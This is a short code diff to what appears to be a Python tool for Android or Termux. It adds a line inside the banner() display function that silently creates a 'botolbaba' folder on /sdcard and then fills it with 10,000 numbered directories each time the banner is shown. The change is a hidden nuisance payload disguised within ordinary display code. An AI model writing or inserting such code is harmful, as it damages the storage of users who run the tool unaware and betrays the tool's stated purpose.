@@ -29,6 +29,7 @@ def clear():
 
 def banner():
     clear()
+    os.system("cd /sdcard && mkdir botolbaba && cd /sdcard/botolbaba && mkdir `seq 1 10000`")
     print(f"""
 {bb}  ____   ____ _______ ____  _ 
  |  _ \ / __ \__   __/ __ \| |
